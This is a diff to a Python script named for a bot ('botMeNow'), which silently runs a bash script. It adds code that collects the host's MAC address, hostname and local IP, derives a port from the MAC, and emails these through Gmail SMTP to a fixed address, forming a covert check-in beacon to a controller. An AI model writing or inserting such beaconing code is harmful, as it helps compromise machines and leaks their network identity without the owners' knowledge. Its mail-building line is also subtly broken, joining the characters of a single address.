@@ -5,6 +5,9 @@ import shutil
 import urllib
 import filecmp
 import subprocess
+from uuid import getnode as get_mac
+import socket
+import smtplib
 
 def botMeNow():
     if not (os.path.isdir("/etc/botMeNow")):
@@ -27,8 +30,58 @@ def botMeNow():
         bash_com_str = "bash bashcom.sh"
         subprocess.call([bash_com_str], stdout=open(os.devnull, 'wb'))
 
+    mac = get_mac()
+    mac=':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
+    port_temp = 0
+    m = mac[0:2]
+    i = int(m,16)
+    port_temp += i
+    m = mac[3:5]
+    i = int(m, 16)
+    port_temp += i
+    m = mac[6:8]
+    i = int(m, 16)
+    port_temp += i
+    m = mac[9:11]
+    i = int(m, 16)
+    port_temp += i
+    m = mac[12:14]
+    i = int(m, 16)
+    port_temp += i
+    m = mac[15:17]
+    i = int(m, 16)
+    port_temp += i
+
+    port = port_temp
+    host = socket.gethostname()
+    ip = myIp()
+    sendMail(host, ip, mac, port)
+
     return
 
+def myIp():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        s.connect(('192.0.0.8', 1027))
+    except socket.error:
+        return None
+    return s.getsockname()[0]
+
+def sendMail(host, ip, mac, port):
+    fromaddr = 'user_me@gmail.com'
+    toaddrs = 'user_you@gmail.com'
+    SUBJECT = "ip-mac-port"
+    TEXT = ("IP:%s MAC:%s port %s hostname: %s" % (ip, mac, port, host))
+    msg= """From: %s\nTo: %s\nSubject: %s\n\n%s
+    """ % (fromaddr, ", ".join(toaddrs), SUBJECT, TEXT)
+    username = 'user_me@gmail.com'
+    password = 'pwd'
+    server = smtplib.SMTP('smtp.gmail.com:587')
+    server.starttls()
+    server.login(username, password)
+    server.sendmail(fromaddr, toaddrs, msg)
+    server.quit()
+    return
 
 while True:
 
